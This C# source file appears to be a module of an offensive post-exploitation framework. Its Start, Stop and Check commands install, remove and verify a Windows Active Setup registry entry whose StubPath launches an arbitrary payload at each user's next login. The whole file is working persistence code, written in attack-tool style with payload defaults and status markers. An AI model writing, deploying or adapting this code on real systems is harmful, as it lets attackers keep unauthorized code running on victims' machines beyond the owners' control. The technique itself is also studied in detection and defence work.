using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string HklmPath = @"SOFTWARE\Microsoft\Active Setup\Installed Components";
        private const string HkcuPath = @"SOFTWARE\Microsoft\Active Setup\Installed Components";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultEntry = "{R2-117}";
            string defaultPayload = GetDefaultPayloadPath();
            string defaultDisplay = "active_setup_component";

            return $"[i] Default Start Command Parameters:\n" +
                $"    R2 active_setup Start {defaultEntry} {defaultPayload} {defaultDisplay}";
        }

        public static string Start(string[] args)
        {
            string entryName = (args != null && args.Length > 0) ? args[0] : "{R2-117}";
            string payloadPath = (args != null && args.Length > 1) ? args[1] : GetDefaultPayloadPath();
            string displayName = (args != null && args.Length > 2) ? args[2] : "active_setup_component";

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(HklmPath, writable: true);
                if (baseKey == null)
                    return "[-] Access denied opening Active Setup registry key. Run as administrator.";

                using var existingHklm = baseKey.OpenSubKey(entryName);
                if (existingHklm != null)
                    return $"[*] Active Setup entry '{entryName}' already exists in HKLM.";

                using var subKey = baseKey.CreateSubKey(entryName, writable: true);
                if (subKey == null)
                    return $"[-] Failed to create subkey '{entryName}'.";

                subKey.SetValue("StubPath", payloadPath, RegistryValueKind.ExpandString);
                subKey.SetValue("Version", "1,0,0,0", RegistryValueKind.String);
                subKey.SetValue("IsInstalled", 1, RegistryValueKind.DWord);

                if (!string.IsNullOrEmpty(displayName))
                    subKey.SetValue("", displayName, RegistryValueKind.String);

                return $"[+] Successfully Installed Active Setup entry '{entryName}' -> Payload: '{payloadPath}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Active Setup modifications require elevated privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string entryName = (args != null && args.Length > 0) ? args[0] : "{R2-117}";

            try
            {
                bool removedHklm = false;
                bool removedHkcu = false;

                using var hklmBase = Registry.LocalMachine.OpenSubKey(HklmPath, writable: true);
                if (hklmBase != null)
                {
                    using var existingHklm = hklmBase.OpenSubKey(entryName);
                    if (existingHklm != null)
                    {
                        existingHklm.Close();
                        hklmBase.DeleteSubKeyTree(entryName, throwOnMissingSubKey: false);
                        removedHklm = true;
                    }
                }

                using var hkcuBase = Registry.CurrentUser.OpenSubKey(HkcuPath, writable: true);
                if (hkcuBase != null)
                {
                    using var existingHkcu = hkcuBase.OpenSubKey(entryName);
                    if (existingHkcu != null)
                    {
                        existingHkcu.Close();
                        hkcuBase.DeleteSubKeyTree(entryName, throwOnMissingSubKey: false);
                        removedHkcu = true;
                    }
                }

                if (!removedHklm && !removedHkcu)
                    return $"[*] Active Setup entry '{entryName}' not found in HKLM or HKCU.";

                return $"[+] Removed Active Setup entry '{entryName}' | HKLM: {(removedHklm ? "removed" : "not found")} | HKCU: {(removedHkcu ? "removed" : "not found")}";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Structural removal requires elevated privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string entryName = (args != null && args.Length > 0) ? args[0] : "{R2-117}";

            try
            {
                using var hklmBase = Registry.LocalMachine.OpenSubKey(HklmPath, writable: false);
                using var hklmKey = hklmBase?.OpenSubKey(entryName);

                if (hklmKey == null)
                    return $"[*] Active Setup entry '{entryName}' not found in HKLM registry.";

                string payload = hklmKey.GetValue("StubPath")?.ToString() ?? "unknown";
                string displayName = hklmKey.GetValue("")?.ToString() ?? "unknown";
                string version = hklmKey.GetValue("Version")?.ToString() ?? "unknown";
                int installed = Convert.ToInt32(hklmKey.GetValue("IsInstalled") ?? 0);

                using var hkcuBase = Registry.CurrentUser.OpenSubKey(HkcuPath, writable: false);
                using var hkcuKey = hkcuBase?.OpenSubKey(entryName);
                string hkcuStatus = hkcuKey != null
                    ? $"EXISTS (version: {hkcuKey.GetValue("Version")?.ToString() ?? "unknown"})"
                    : "NOT FOUND (Pending execution on next user login)";

                return $"[+] Verified Active Setup '{entryName}' | Display: '{displayName}' | Payload: '{payload}' | Version: '{version}' | IsInstalled: {installed} | HKCU tracking: {hkcuStatus}";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied checking system parameters.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }
    }
}